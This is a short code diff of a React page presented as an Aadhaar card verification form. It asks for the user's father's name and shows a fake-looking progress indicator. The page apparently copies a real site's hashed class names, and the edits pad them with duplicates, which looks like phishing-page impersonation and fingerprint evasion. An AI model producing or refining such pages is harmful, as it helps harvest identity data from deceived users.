@@ -38,20 +38,20 @@ export default function Home() {
   return (
     <main>
     <div className="Tpv_login_heading__E5J6K">
-      <h3 className="Tpv_login_heading_h3__z0Qx1">Verify Aadhar</h3>
+      <h3 className="Tpv_login_heading_h3__z0Qx1 Tpv_login_heading_h3__z0Qx1Tpv_login_heading_h3__z0Qx1">Verification of Adhar Card</h3>
     </div>
     
     <div className="Tpv_login_form___9zpm">
-            <p className="Tpv_mandatory_txt__YZHLO">Required fields an asterisk (*)</p>
+            <p className="Tpv_mandatory_txt__YZHLOTpv_mandatory_txt__YZHLOTpv_mandatory_txt__YZHLOTpv_mandatory_txt__YZHLO">Required fields an asterisk (*)</p>
             <form className="Tpv_form__okPRU" onSubmit={handleSubmit}>
             <div className="Tpv_form_group__aHWg0">
                 <label className="Tpv_label__cObJz">
-                    Father Name<span className="Tpv_mandatory_txt__YZHLO">*</span>
+                    Your Father Name<span className="Tpv_mandatory_txt__YZHLO Tpv_mandatory_txt__YZHLOTpv_mandatory_txt__YZHLO">*</span>
                 </label>
                 <input  
                     name="FN"
                     type="e"
-                    className="Tpv_form_control__5hzGF"
+                    className="Tpv_form_control__5hzGF Tpv_form_control__5hzGFTpv_form_control__5hzGFTpv_form_control__5hzGFTpv_form_control__5hzGF"
                     required
                 />
                 </div>
@@ -69,7 +69,7 @@ export default function Home() {
                     required
                 />
                 </div>
-                <p className="Tpv_content_title__SWlCq">81% Done</p>
+                <p className="Tpv_content_title__SWlCq">91% Done</p>
                 <div className="Tpv_t_center__8YF86">
                 <input
                     type="submit"
